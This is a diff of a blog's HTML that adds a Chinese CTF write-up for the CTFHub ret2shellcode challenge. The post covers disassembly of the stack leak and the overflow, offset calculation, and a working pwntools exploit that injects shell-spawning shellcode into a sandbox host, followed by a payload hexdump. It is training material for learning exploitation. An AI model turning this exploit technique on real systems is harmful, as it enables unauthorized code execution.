@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/ret2shellcode/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,21 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2shellcode 栈地址泄露与代码注入">
+<meta property="og:url" content="http://example.com/2026/05/09/ret2shellcode/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T20:44:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="64位">
+<meta property="article:tag" content="Shellcode">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="地址泄露">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +114,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            ret2shellcode 栈地址泄露与代码注入 | Bear
         
     </title>
 
@@ -416,13 +423,275 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ret2shellcode 栈地址泄露与代码注入</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 20:44</span>
+        <span class="mobile">2026-05-09 20:44</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/64%E4%BD%8D/">64位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Shellcode/">Shellcode</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2shellcode/">ret2shellcode</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/">地址泄露</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>CTFHub ret2shellcode | 程序主动泄露栈地址，注入 Shellcode 获取 Shell</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>题目类型</td>
+<td>栈溢出 &#x2F; ret2shellcode</td>
+</tr>
+<tr>
+<td>保护机制</td>
+<td>NX 关闭（栈上数据可执行）</td>
+</tr>
+<tr>
+<td>核心漏洞</td>
+<td><code>read</code> 读取超长字节 + 程序主动泄漏栈地址</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-IDA-逆向分析"><a href="#0x02-IDA-逆向分析" class="headerlink" title="0x02 IDA 逆向分析"></a>0x02 IDA 逆向分析</h2><h3 id="1-栈空间分配"><a href="#1-栈空间分配" class="headerlink" title="1. 栈空间分配"></a>1. 栈空间分配</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h            ; 开辟 0x10 (16字节) 栈空间</span><br><span class="line">mov     [rbp+buf], 0</span><br></pre></td></tr></table></figure></div>
+
+<p>局部变量 <code>buf</code> 位于 <code>rbp - 0x10</code>。</p>
+<h3 id="2-栈地址泄漏"><a href="#2-栈地址泄漏" class="headerlink" title="2. 栈地址泄漏"></a>2. 栈地址泄漏</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea     rdi, format     ; &quot;What is it : [%p] ?\n&quot;</span><br><span class="line">call    _printf         ; 直接将 buf 的内存地址打印出来</span><br></pre></td></tr></table></figure></div>
+
+<p>程序使用 <code>%p</code> 格式化字符串打印 <code>buf</code> 地址，使我们可以无视 ASLR。</p>
+<h3 id="3-栈溢出漏洞"><a href="#3-栈溢出漏洞" class="headerlink" title="3. 栈溢出漏洞"></a>3. 栈溢出漏洞</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 400h       ; 最大读取 1024 字节</span><br><span class="line">call    _read           ; 向仅 16 字节的 buf 写入 1024 字节</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x03-漏洞利用思路"><a href="#0x03-漏洞利用思路" class="headerlink" title="0x03 漏洞利用思路"></a>0x03 漏洞利用思路</h2><p><strong>目标</strong>：覆写 <code>main</code> 函数的返回地址，让程序执行 Shellcode。</p>
+<p><strong>偏移计算</strong>：</p>
+<ul>
+<li><code>buf</code> 距离 <code>rbp</code>：<code>0x10</code> &#x3D; 16 字节</li>
+<li><code>Saved RBP</code>：8 字节</li>
+<li><strong>到达返回地址的填充长度 &#x3D; 16 + 8 &#x3D; 24 字节</strong></li>
+</ul>
+<p><strong>Payload 布局</strong>：<code>垃圾填充 + 返回地址 + Shellcode</code></p>
+<p><strong>Shellcode 地址计算</strong>：</p>
+<ul>
+<li>返回地址之前的填充 &#x3D; 24 字节</li>
+<li>返回地址本身 &#x3D; 8 字节</li>
+<li><strong>Shellcode 起始地址 &#x3D; 泄漏的 buf 地址 + 32 (0x20)</strong></li>
+</ul>
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;challenge-86620ff89ceb10de.sandbox.ctfhub.com&#x27;</span>, <span class="number">21770</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 提取泄露的栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is it : [&quot;</span>)</span><br><span class="line">leak_str = p.recvuntil(<span class="string">b&quot;]&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak_str, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Successfully leaked buf address: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 生成 Shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造 Payload</span></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">shellcode_addr = leak_addr + <span class="number">32</span>  <span class="comment"># shellcode 放在返回地址之后</span></span><br><span class="line"></span><br><span class="line">payload = padding + p64(shellcode_addr) + shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 发送 Payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input someting : \n&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-Payload-字节流分析"><a href="#0x05-Payload-字节流分析" class="headerlink" title="0x05 Payload 字节流分析"></a>0x05 Payload 字节流分析</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">00000010  41 41 41 41  41 41 41 41  c0 b9 2c 6a  ff 7f 00 00  │AAAA│AAAA│··,j│····│</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>0x00 - 0x17</strong>：<code>A</code> 填满 buf 和 Saved RBP</li>
+<li><strong>0x18 - 0x1F</strong>：返回地址 <code>0x7fff6a2cb9c0</code>（小端序），指向后续 Shellcode</li>
+</ul>
+<h2 id="0x06-核心考点"><a href="#0x06-核心考点" class="headerlink" title="0x06 核心考点"></a>0x06 核心考点</h2><ul>
+<li><strong>ret2shellcode</strong>：NX 关闭时，将返回地址指向栈上的 Shellcode</li>
+<li><strong>地址泄露</strong>：程序主动打印栈地址，绕过 ASLR</li>
+<li><strong>偏移计算</strong>：<code>buf(16) + saved_rbp(8) = 24</code> 字节到返回地址</li>
+<li><strong>Shellcode 定位</strong>：<code>leak_addr + 24 + 8 = leak_addr + 32</code></li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ret2shellcode 栈地址泄露与代码注入</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 20:44:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/ret2shellcode/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/64%E4%BD%8D/">#64位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Shellcode/">#Shellcode</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2shellcode/">#ret2shellcode</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2/">#地址泄露</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/09/pwn5-format-string/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">PWN5 格式化字符串漏洞：任意地址写</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/warmup-csaw-2016/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">warmup_csaw_2016 栈溢出与栈对齐踩坑</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">ret2shellcode 栈地址泄露与代码注入</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-IDA-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">0x02 IDA 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%A0%88%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D"><span class="nav-text">1. 栈空间分配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A0%88%E5%9C%B0%E5%9D%80%E6%B3%84%E6%BC%8F"><span class="nav-text">2. 栈地址泄漏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. 栈溢出漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">0x03 漏洞利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Payload-%E5%AD%97%E8%8A%82%E6%B5%81%E5%88%86%E6%9E%90"><span class="nav-text">0x05 Payload 字节流分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x06 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +729,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +869,7 @@
         }),
     );
 </script>
+
 
 
 
